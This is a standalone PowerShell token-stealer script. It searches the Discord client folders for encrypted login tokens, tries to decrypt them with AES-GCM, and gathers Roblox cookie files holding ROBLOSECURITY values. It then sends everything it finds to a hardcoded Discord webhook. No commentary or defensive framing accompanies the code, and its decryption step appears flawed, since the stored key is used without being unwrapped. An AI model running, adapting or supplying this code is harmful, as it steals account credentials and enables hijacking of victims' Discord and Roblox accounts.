$w='https://discord.com/api/webhooks/1538403770965426247/cKkhSXToyltnfneUV1D1q8kV1Y3KpH_iUXK8rgozjvNOtKQjXWxBj-l9EZDLdmPI-AEL';
$t=@();
foreach($p in @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb")){
  $ls=Join-Path $p 'Local State';
  $ldb=Join-Path $p 'Local Storage\leveldb';
  if(Test-Path $ls){
    $s=Get-Content $ls -Raw|ConvertFrom-Json;
    $k=[Convert]::FromBase64String($s.os_crypt.encrypted_key)[5..([Convert]::FromBase64String($s.os_crypt.encrypted_key).Length-1)];
    if(Test-Path $ldb){
      Get-ChildItem $ldb -Filter *.ldb|%{
        $c=Get-Content $_.FullName -Raw;
        $m=[regex]::Matches($c,'dQw4w9WgXcQ:[^\s]+');
        foreach($x in $m){
          $e=$x.Value.Replace('dQw4w9WgXcQ:','');
          $eb=[Convert]::FromBase64String($e);
          $n=$eb[3..14];
          $ct=$eb[15..($eb.Length-16)];
          $tag=$eb[($eb.Length-16)..($eb.Length-1)];
          $a=New-Object System.Security.Cryptography.AesGcm;
          $pt=New-Object byte[] $ct.Length;
          $a.Decrypt($k,$n,$ct,$tag,$pt);
          $d=[System.Text.Encoding]::UTF8.GetString($pt);
          if($d -match '^[A-Za-z0-9\.\-_]{24,}\.[A-Za-z0-9\.\-_]{6,}\.[A-Za-z0-9\.\-_]{27,}$'){$t+=$d}
        }
      }
    }
  }
};
$rc=@();
$rp=@("$env:LOCALAPPDATA\Roblox\cookies.txt","$env:APPDATA\Roblox\cookies.txt");
foreach($f in $rp){
  if(Test-Path $f){
    $c=Get-Content $f -Raw -ErrorAction SilentlyContinue;
    if($c -match 'ROBLOSECURITY'){$rc+=$c}
  }
};
$dt = if($t.Count){$t -join ','}else{'none'};
$rb = if($rc.Count){$rc -join ','}else{'none'};
$msg = "Discord Tokens: $dt | Roblox Cookies: $rb";
$payload=@{content=$msg}|ConvertTo-Json;
Invoke-RestMethod -Uri $w -Method Post -ContentType 'application/json' -Body $payload
